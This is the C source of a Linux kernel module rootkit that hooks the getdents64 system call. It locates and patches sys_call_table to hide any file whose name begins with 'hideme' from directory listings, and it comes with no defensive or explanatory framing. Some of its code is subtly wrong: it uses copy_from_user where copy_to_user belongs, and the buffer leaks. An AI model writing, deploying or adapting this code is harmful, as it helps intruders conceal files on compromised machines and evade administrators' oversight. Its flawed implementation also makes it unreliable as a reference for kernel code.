#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/dirent.h>
#include <linux/kallsyms.h>
#include <asm/ptrace.h>
#include <asm/cacheflush.h>

MODULE_LICENSE("GPL");

#define HIDE_FILE "hideme"

unsigned long * sys_call_table;
asmlinkage long unsigned (*org_getdents64) (const struct pt_regs* pt_regs);

int set_page_write(unsigned long addr) {
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if(pte->pte &~ _PAGE_RW)
    {
        pte->pte |= _PAGE_RW;
        printk(KERN_INFO " set to rw");
        return 1;
    }
    return 0;
}

asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs){
    printk(KERN_INFO "Hooked");
    int ret = org_getdents64(pt_regs);
    int err;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;

    unsigned long i = 0;
    if (ret <= 0)
        return ret;
    kdirent = kvzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
    {
        return ret;
    }
    err = copy_from_user((void *) kdirent, dirent, (unsigned long) ret);

    if (err)
    {
        kvfree(kdirent);
        return ret;
    }

    while (i < ret)
    {
        dir = (void*) kdirent +i;
        //TODO: define
        if (((memcmp(HIDE_FILE, (char*) dir->d_name, strlen(HIDE_FILE))) == 0))
        {
            printk(KERN_INFO "found secret file\n");
            if (dir == kdirent){
                ret -= dir->d_reclen;
                memmove(dir, (void*)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        }
        else
            prev = dir;
        i += dir->d_reclen;

    }
    err = copy_from_user(dirent, kdirent, (unsigned long) ret);
    if (err)
    {
        kvfree(kdirent);
        return ret;
    }
    return ret;

}

int set_page_ro(unsigned long addr) {
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
    printk(KERN_INFO "changed to ro\n");
    return 0;
}

int replace_getdents_syscall(void){
    printk(KERN_INFO "init");
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    printk(KERN_INFO "sys_call_table: %lx", sys_call_table);
    if (sys_call_table)
    {
        if (set_page_write((unsigned long) sys_call_table))
        {
            printk(KERN_INFO "loading hooks");
            org_getdents64 = (long unsigned int (*)(const struct pt_regs *))sys_call_table[__NR_getdents64];
            printk(KERN_INFO "org_getdents64: %lx", org_getdents64);
            sys_call_table[__NR_getdents64] = (unsigned long int)sys_getdents64_hook;
            set_page_ro((unsigned long)sys_call_table);
            return 0;
        }
        return 1;
    }
    return 1;

}

static void __exit getdents_hook_exit(void) {
    if (set_page_write((unsigned long) sys_call_table))
        {
            printk(KERN_INFO "unloading hooks");
            sys_call_table[__NR_getdents64] = (unsigned long int)org_getdents64;
            set_page_ro((unsigned long)sys_call_table);
        }
}

module_init(replace_getdents_syscall);
module_exit(getdents_hook_exit);